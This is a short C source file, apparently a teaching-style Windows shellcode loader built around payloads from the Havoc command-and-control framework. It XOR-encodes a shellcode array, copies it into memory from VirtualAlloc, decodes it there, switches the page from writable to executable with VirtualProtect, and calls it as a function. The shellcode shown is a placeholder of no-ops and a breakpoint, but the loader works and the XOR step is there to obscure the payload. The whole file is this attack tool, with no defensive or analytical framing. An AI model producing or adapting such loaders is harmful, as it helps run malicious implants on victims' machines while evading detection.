#include <stdio.h>
#include <string.h>

#define MEM_COMMIT        0x00001000
#define MEM_RESERVE       0x00002000
#define PAGE_READWRITE    0x04
#define PAGE_EXECUTE_READ 0x20
#define MEM_RELEASE       0x00008000

typedef unsigned char      BYTE;
typedef unsigned int       DWORD;
typedef void*              LPVOID;
typedef unsigned long long SIZE_T;
typedef int                BOOL;

/* function declarations — live in kernel32.dll */
LPVOID VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
BOOL   VirtualProtect(LPVOID, SIZE_T, DWORD, DWORD *);
BOOL   VirtualFree(LPVOID, SIZE_T, DWORD);

int main(void) {
    int i; /* variable declaration */

    /* variable declaration — raw shellcode as it comes from Havoc */
    unsigned char shellcode[] = { 0x90, 0x90, 0x90, 0xcc };

    /* variable declaration */
    SIZE_T len = sizeof(shellcode);

    /* variable declaration */
    DWORD old_protect;

    /* XOR loop — encrypt raw shellcode in place before copying into buf */
    for (i = 0; i < len; i++)
        shellcode[i] ^= 0x41;
    printf("[+] shellcode encrypted\n");

    /* variable declaration + function call — allocate RW buffer */
    LPVOID buf = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (buf == NULL) { printf("[-] VirtualAlloc failed\n"); return 1; }
    printf("[+] allocated RW memory at %p\n", buf);

    /* variable declaration + cast — cast once, use everywhere */
    BYTE *bytes = (BYTE *)buf;

    /* function call — copy encrypted shellcode into RW buffer */
    memcpy(bytes, shellcode, len);
    printf("[+] encrypted shellcode copied\n");

    /* XOR loop — decrypt in place inside buf at runtime */
    for (i = 0; i < len; i++)
        bytes[i] ^= 0x41;
    printf("[+] shellcode decrypted in buffer\n");

    /* function call — flip RW to RX, done writing */
    VirtualProtect(bytes, len, PAGE_EXECUTE_READ, &old_protect);
    printf("[+] memory flipped RW -> RX\n");

    /* variable declaration + cast — reinterpret address as callable function */
    void (*exec)() = (void(*)())bytes;
    printf("[+] executing\n");

    /* function pointer call */
    exec();

    /* function call — free region */
    VirtualFree(buf, 0, MEM_RELEASE);
    printf("[+] freed\n");

    return 0;
}